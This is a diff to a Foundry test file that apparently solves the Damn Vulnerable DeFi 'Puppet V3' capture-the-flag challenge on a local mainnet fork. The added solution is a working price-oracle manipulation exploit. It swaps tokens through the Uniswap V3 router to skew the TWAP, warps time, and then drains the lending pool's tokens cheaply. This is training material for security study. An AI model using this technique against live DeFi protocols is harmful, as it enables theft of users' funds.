@@ -10,6 +10,7 @@ import {FixedPointMathLib} from "solmate/utils/FixedPointMathLib.sol";
 import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
 import {INonfungiblePositionManager} from "../../src/puppet-v3/INonfungiblePositionManager.sol";
 import {PuppetV3Pool} from "../../src/puppet-v3/PuppetV3Pool.sol";
+import {ISwapRouter} from "@uniswap/v3-periphery/contracts/interfaces/ISwapRouter.sol";
 
 contract PuppetV3Challenge is Test {
     address deployer = makeAddr("deployer");
@@ -44,7 +45,8 @@ contract PuppetV3Challenge is Test {
      */
     function setUp() public {
         // Fork from mainnet state at specific block
-        vm.createSelectFork((vm.envString("MAINNET_FORKING_URL")), 15450164);
+        // vm.createSelectFork((vm.envString("MAINNET_FORKING_URL")), 15450164);
+        vm.createSelectFork("https://rpc.ankr.com/eth", 15450164);
 
         startHoax(deployer);
 
@@ -118,7 +120,39 @@ contract PuppetV3Challenge is Test {
     /**
      * CODE YOUR SOLUTION HERE
      */
-    function test_puppetV3() public checkSolvedByPlayer {}
+    function test_puppetV3() public checkSolvedByPlayer {
+        // 1. Getting the uniswap router to swap token for weth
+        address uniswapRouter = 0xE592427A0AEce92De3Edee1F18E0157C05861564;
+        token.approve(uniswapRouter, type(uint256).max);
+
+        // 2. Getting the weth from uniswap from token
+        // after the swap, we will have all the weth in player's account
+        // with high liquidity of token in uniswap, it will become cheap and easy for us 
+        // to borrow all the token with this much weth 
+        ISwapRouter(uniswapRouter).exactInputSingle(
+            ISwapRouter.ExactInputSingleParams(
+                address(token),
+                address(weth),
+                3000,
+                address(player),
+                block.timestamp,
+                PLAYER_INITIAL_TOKEN_BALANCE,
+                0,
+                0
+            )
+        );
+
+        // Waiting to get updated price
+        vm.warp(block.timestamp + 114);
+        uint256 quote = lendingPool.calculateDepositOfWETHRequired(LENDING_POOL_INITIAL_TOKEN_BALANCE);
+        // setting up approval of weth, before borrowing
+        weth.approve(address(lendingPool), quote);
+        // giving all the weth to lending pool, to get all the tokens
+        // after the swap, liquidity of token will be high, so we can get it for cheap
+        // note oracle manipulation 
+        lendingPool.borrow(LENDING_POOL_INITIAL_TOKEN_BALANCE);
+        token.transfer(address(recovery), LENDING_POOL_INITIAL_TOKEN_BALANCE);
+    }
 
     /**
      * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
